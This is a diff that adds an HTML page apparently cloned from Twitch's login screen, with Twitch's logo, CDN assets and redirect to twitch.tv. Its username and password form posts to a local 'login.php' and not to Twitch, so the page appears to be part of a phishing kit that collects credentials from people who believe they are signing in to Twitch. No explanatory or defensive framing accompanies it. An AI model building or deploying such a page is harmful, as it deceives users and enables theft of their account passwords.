@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html data-passport-version="5" lang="en"><head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://passport-cdn.ttvnw.net/styles/passport_b4a9804bc28d1f8b2e891da8fe5d3d2a.css">
+	<link rel="shortcut icon" href="../assets/img/favicon.png" type="image/x-icon">
+  <title>Login</title>
+
+	
+	
+	
+
+  
+    <base target="_self">
+  
+<script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/api2/v1528855115741/recaptcha__en.js"></script></head>
+
+<body class="kraken-page">
+  <div class="container" role="main">
+    <div class="authorize">
+      <div class="wrap">
+        
+          
+
+<div class="header clearfix">
+  <a id="header_logo">
+    <svg class="svg-logo_twitch" version="1.1" viewBox="-2.5 0 100 50" x="0px" y="0px">
+      <path clip-rule="evenodd" d="M88,5h-6V0h-9l-6,5h-5.5L59,7.5V5h-5V0H36v5H16l-5-5H0v22l5,5.25L14,32h6v-1.5l3,1.5h12l2-3l1,3h7v-3l3,3h8l0.5-3l2.5,3h10l3-3v3h4l3-3v3h7l7-6V10L88,5z M13,13H8v6h5v6H6l-4-4V2h6v5h5V13z M36,21.5L32.5,25H15V7h6v12h2V7h6v12h2V7h5V21.5z M44,25h-6V7h6V25z M44,5h-6V2h6V5z M57,13h-5v6h5v6h-7l-4-4V2h6v5h5V13z M72,13h-7v6h7v6h-9l-4-4V11l4-4h9V13z M91,25h-6V13h-5v12h-6V2h6v5h7l4,4V25z" fill-rule="evenodd"></path>
+    </svg>
+  </a>
+</div>
+
+
+        
+        <div class="card">
+          <div class="text-content">
+            
+              
+                <div class="item">
+                  <button class="fb_button button" disabled="">
+                    <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg"><path d="M16.936 0H.99C.442 0 0 .443 0 .99v15.946c0 .547.443.99.99.99h8.585v-6.942H7.24V8.28h2.335V6.282c0-2.315 1.414-3.576 3.48-3.576.99 0 1.84.074 2.087.107v2.42H13.71c-1.124 0-1.342.534-1.342 1.317v1.73h2.68l-.35 2.704h-2.33v6.942h4.568c.547 0 .99-.443.99-.99V.99c0-.547-.443-.99-.99-.99" fill="#FFF" fill-rule="evenodd"></path></svg>
+                      <span>Connect with Facebook</span>
+                  </button>
+									<input name="facebook" type="hidden">
+                  <input name="facebook_submit_url" value="/facebook_login/new" type="hidden">
+                </div>
+              
+              
+                
+    <div class="item">
+      <ul class="tabs">
+        <li id="login_tab" class="tab selected"><a target="_self" href="#">Log In</a></li>
+        <li id="signup_tab" class="tab "><a target="_self" href="/signup/new?client_id=36926892495301a63b2e9350a38d3d6dbf72ad81e571a3ebba4687250ec8f352c70b3e91229602f73e1335528f3caa00a5cf513f484d7003784e722f2ce7a216&amp;embed=0&amp;error_code=&amp;redirect_path=https%3A%2F%2Fwww.twitch.tv%2F&amp;style=&amp;sudo_reason=&amp;username=">Sign Up</a></li>
+      </ul>
+    </div>
+
+              
+            
+            <div class="item">
+              
+              
+              
+
+
+  <form method="post" action="login.php" id="loginForm" class="col-md-6">
+
+  
+
+  
+  <input name="client_id" value="36926892495301a63b2e9350a38d3d6dbf72ad81e571a3ebba4687250ec8f352c70b3e91229602f73e1335528f3caa00a5cf513f484d7003784e722f2ce7a216" type="hidden">
+  <input id="authenticity_token" value="BCJF+CLezGdQV0KtCNV/GzqIzUNd6y5o5YSz/fBRzpDgmly61iNOPZye5F0LMlgz2DOXtcv8h+99aWcZyO+GdQ==" type="hidden">
+
+  <input name="origin_uri" value="" type="hidden">
+  <input name="redirect_path" value="https://www.twitch.tv/" type="hidden">
+  <input name="embed" value="false" type="hidden">
+  <input name="time_to_submit" value="" type="hidden">
+  
+    <div class="field item">
+        <label for="username">Username</label>
+        <input autofocus="" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" name="username" id="username" class="text" value="" type="text">
+    </div>
+  
+
+    <div class="field item" id="password">
+        <label for="password">Password</label>
+        <input autocapitalize="none" name="password" class="text" type="password">
+        <div class="help sub">
+          <a id="reset" href="/password_resets/new?client_id=36926892495301a63b2e9350a38d3d6dbf72ad81e571a3ebba4687250ec8f352c70b3e91229602f73e1335528f3caa00a5cf513f484d7003784e722f2ce7a216" target="_blank" class="small">Trouble logging in?</a>
+        </div>
+    </div>
+  <div class="buttons">
+    <button class="primary button js-login-button" type="submit">
+      <span class="js-login-text">
+        Log In
+      </span>
+    </button>
+  </div>
+</form>
+
+            </div>
+          </div>
+        </div>
+      </div>
+
+      
+      <div id="fb-root"></div>
+    </div>
+  </div>
+
+  
+<img class="tracking-pixel" src="/client_event/new?client_id=36926892495301a63b2e9350a38d3d6dbf72ad81e571a3ebba4687250ec8f352c70b3e91229602f73e1335528f3caa00a5cf513f484d7003784e722f2ce7a216&amp;title=Login">
+
+  
+	<input name="show_captcha" value="true" type="hidden">
+	<input name="lang" value="en" type="hidden">
+	<script src="https://passport-cdn.ttvnw.net/javascripts/common_3b3d0c00ce7772c5496a.js"></script>
+  <script src="https://passport-cdn.ttvnw.net/javascripts/login_6df9da93186bf3c1c619.js"></script>
+
+<div style="background-color: #fff; border: 1px solid #ccc; box-shadow: 2px 2px 3px rgba(0, 0, 0, 0.2); position: absolute; left: 0px; top: -10000px; transition: visibility 0s linear 0.3s, opacity 0.3s linear; opacity: 0; visibility: hidden; z-index: 2000000000;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: #fff; opacity: 0.05;  filter: alpha(opacity=5)"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0; height: 0; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0; height: 0; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative; width: 0px; height: 0px;"><iframe title="recaptcha challenge" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=v1528855115741&amp;k=6Ld65QcTAAAAAMBbAE8dkJq4Wi4CsJy7flvKhYqX&amp;cb=jd7qnjgruuso#jeusf7lf0dz1" style="width: 0px; height: 0px;" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" name="jeusf7lf0dz1" frameborder="0"></iframe></div></div></body></html>
